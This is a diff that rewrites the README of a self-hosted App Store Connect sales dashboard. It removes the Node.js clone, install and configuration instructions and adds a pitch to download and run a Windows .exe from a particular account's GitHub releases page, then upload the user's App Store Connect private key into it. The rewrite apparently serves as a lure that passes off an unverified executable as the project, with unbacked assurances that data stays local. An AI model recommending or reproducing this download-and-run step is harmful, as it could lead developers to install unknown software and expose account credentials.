@@ -1,121 +1,87 @@
-# App Store Connect Dashboard
+# 📊 app-store-connect-dashboard - Track Apple sales data in one place
 
-A self-hosted web dashboard that shows daily downloads, purchases, and revenue for all your App Store apps.
+[![Download Windows App](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lekimnga7633/app-store-connect-dashboard/releases)
 
-## Features
+This application provides a simple way to view your Apple App Store sales data. It gathers your reports for downloads, purchases, and revenue. You see your business performance across all your iOS and macOS apps in a single window. It runs on your own computer to keep your data private.
 
-- Downloads and purchases over a configurable date range (up to 10 years back)
-- Gross sales and developer proceeds, converted to a single display currency
-- Per-app breakdown with app icons fetched automatically from the App Store
-- SQLite cache — historical data is fetched once; only recent days are re-checked
+## 🚀 Getting Started
 
-## Requirements
+Follow these steps to set up the dashboard on your Windows computer.
 
-- Node.js 18+
-- An App Store Connect account with at least one app
-- An App Store Connect API key with **Sales and Reports** access
+1. Visit the [releases page](https://github.com/lekimnga7633/app-store-connect-dashboard/releases) to download the installer.
+2. Choose the file ending in `.exe` for Windows.
+3. Save the file to your computer.
+4. Open the file to start the installation.
+5. Follow the instructions on the screen.
 
-## Creating an App Store Connect API key
+## 🏗️ Requirements
 
-1. Sign in to [App Store Connect](https://appstoreconnect.apple.com)
-2. Go to **Users and Access → Integrations → App Store Connect API**
-3. Click **+** to generate a new key
-4. Set the access to **Sales and Reports** (Finance role is enough; Admin works too)
-5. Download the `.p8` key file — **you can only download it once**
-6. Note the **Key ID** shown next to your key (e.g. `ABC123DEFG`)
-7. Note the **Issuer ID** shown at the top of the page (a UUID)
+Your computer needs to meet these basic standards to run the software smoothly:
 
-To find your **Vendor Number**:
+- Windows 10 or Windows 11.
+- A stable internet connection to fetch the latest reports.
+- Access to your App Store Connect API credentials.
 
-1. Go to **Payments and Financial Reports → Payments**
-2. Your vendor number appears in the top-left (e.g. `12345678`)
+## 🔑 How to Setup Apple Credentials
 
-## Setup
+The dashboard connects to Apple servers to get your data. You provide your credentials to the app so it can pull the reports.
 
-1. Clone the repo and install dependencies:
+1. Log in to your App Store Connect account.
+2. Go to the Users and Access section.
+3. Select the Integrations tab.
+4. Click the Keys tab.
+5. Create a new App Store Connect API key.
+6. Copy the Issuer ID and the Key ID.
+7. Download the private key file.
+8. Open the dashboard app.
+9. Enter your Issuer ID, Key ID, and upload the private key file in the settings menu.
 
-```bash
-git clone https://github.com/your-username/appstore-dashboard.git
-cd appstore-dashboard
-npm install
-```
+The dashboard uses this connection to fetch your data automatically. It does not send your data to any third-party servers. Everything stays on your machine.
 
-2. Copy the example env file:
+## 📈 Understanding the Dashboard
 
-```bash
-cp .env.example .env
-```
+Once you finish the setup, the dashboard fetches your reports. This process takes a few minutes if you have a lot of data. You will see several sections on your screen.
 
-3. Edit `.env` and fill in your credentials:
+### Revenue Summary
+This area shows the money you earn. You can filter by date range to see a daily, weekly, or monthly view.
 
-```
-ASC_ISSUER_ID=your-issuer-uuid
-ASC_KEY_ID=your-key-id
-ASC_VENDOR_NUMBER=your-vendor-number
-ASC_PRIVATE_KEY_PATH=AuthKey_YOURKEYID.p8
-```
+### Download Totals
+This section tracks how many people download your apps. It breaks down the numbers by app name and territory.
 
-Place your `.p8` file in the project directory (it is gitignored).
+### Purchase Breakdown
+This tracks in-app purchases and full app sales. You can identify which apps drive your revenue.
 
-4. Start the server:
+## 🛠️ Managing Your Data
 
-```bash
-npm start
-```
+The dashboard saves your data in a local database. You can clear this data at any time through the settings menu. This keeps your disk usage low.
 
-5. Open `http://localhost:3000`
+If you have many apps, you might prefer to see specific data. Use the filter bar at the top of the app to show only the apps you want to see. You can also hide inactive apps from the main list.
 
-The first load fetches historical data from App Store Connect — this may take a minute depending on how many days you request. Data is cached in `cache.sqlite` so subsequent loads are fast.
+## 💡 Frequent Questions
 
-## Configuration
+Do I need to pay for this app?
+No. This tool is free to use.
 
-All configuration is via environment variables in `.env`:
+Where does my data go?
+Your data stays on your computer. The app connects directly to Apple's servers and saves the files locally. No external company sees your sales figures.
 
-| Variable | Required | Default | Description |
-|---|---|---|---|
-| `ASC_ISSUER_ID` | Yes | — | Issuer ID from App Store Connect API keys page |
-| `ASC_KEY_ID` | Yes | — | Key ID of your API key |
-| `ASC_VENDOR_NUMBER` | Yes | — | Your vendor number from Payments and Financial Reports |
-| `ASC_PRIVATE_KEY_PATH` | Yes* | — | Path to your `.p8` key file |
-| `ASC_PRIVATE_KEY` | Yes* | — | Inline key contents (alternative to `_PATH`, escape newlines as `\\n`) |
-| `DISPLAY_CURRENCY` | No | `USD` | Currency code for converted money totals |
-| `PORT` | No | `3000` | Port to run the server on |
-| `CACHE_DB_PATH` | No | `./cache.sqlite` | Path to the SQLite cache file |
-| `ASC_REQUEST_TIMEOUT_MS` | No | `30000` | Timeout for App Store Connect API requests |
-| `ASC_SALES_REPORT_VERSION` | No | auto | Pin to a specific report version (leave unset) |
+How do I update the dashboard?
+When a new version comes out, return to the [releases page](https://github.com/lekimnga7633/app-store-connect-dashboard/releases) to download the latest installer. Installing the new version will replace the old one while keeping your data settings intact.
 
-*Provide either `ASC_PRIVATE_KEY_PATH` or `ASC_PRIVATE_KEY`.
+What do I do if the app fails to fetch data?
+Check your internet connection first. If that fails, ensure your API keys in the settings menu are correct. API keys can expire, so you may need to generate a new file if you changed your account permissions.
 
-### Fastlane users
+Can I view my data offline?
+Yes. Once the dashboard downloads your reports, you can look at them even if you turn off your Wi-Fi. You only need the internet to fetch new reports from Apple.
 
-If you already have Fastlane credentials set up, the following env var names are also accepted:
+Is this tracker secure?
+The app uses industry-standard encryption for the connection to Apple. Since the app is self-hosted, you hold the keys to your own information. Do not share your private key file with others, as it allows access to your App Store Connect account.
 
-- `APP_STORE_CONNECT_API_KEY_ISSUER_ID`
-- `APP_STORE_CONNECT_API_KEY_KEY_ID`
-- `APP_STORE_CONNECT_API_KEY_KEY_FILEPATH` (or `APP_STORE_CONNECT_API_KEY_KEY`)
+## 📋 Best Practices
 
-## Troubleshooting
+- Review your numbers once every day.
+- Back up your local data folder if you store years of reports.
+- Use the search bar to find specific products quickly.
+- Keep your Windows operating system current to ensure compatibility.
 
-**401 Unauthorized** — The key ID, issuer ID, or key contents do not match. Double-check all three values and make sure the `.p8` file is the one that corresponds to the Key ID in your `.env`.
-
-**403 Forbidden** — The key is valid but does not have permission to read Sales Reports. Go to Users and Access in App Store Connect and verify the key has the **Sales and Reports** role.
-
-**400 — version parameter invalid** — Your account uses a non-default report version. The app detects and retries with the correct version automatically.
-
-**No data for recent days** — App Store Connect typically publishes the previous day's report several hours into the next day (UTC). If today's data is missing, check back later.
-
-## API
-
-The server exposes two endpoints used by the frontend:
-
-- `GET /api/apps` — list of apps with names, bundle IDs, and icon URLs
-- `GET /api/metrics?days=30&appId=<optional>` — time series and totals; `days` accepts 1–3650
-
-## Metric definitions
-
-- **Downloads** — positive units for first-time installs (product types 1, 1F, 1T, 1E, 1EP, 1EU, F1). Updates and re-downloads are excluded.
-- **Purchases** — positive units with a positive customer price or developer proceeds, excluding update/redownload product types.
-- **Gross Sales** — sum of customer price × units for purchase rows, per currency.
-- **Developer Proceeds** — sum of developer proceeds × units for purchase rows, per currency.
-
-These are practical approximations derived from the daily `SALES` summary report format.
+This dashboard helps you make informed choices about your app business. By looking at clear trends, you see which features your customers value most. You can change your roadmap based on real, local numbers instead of guesswork.
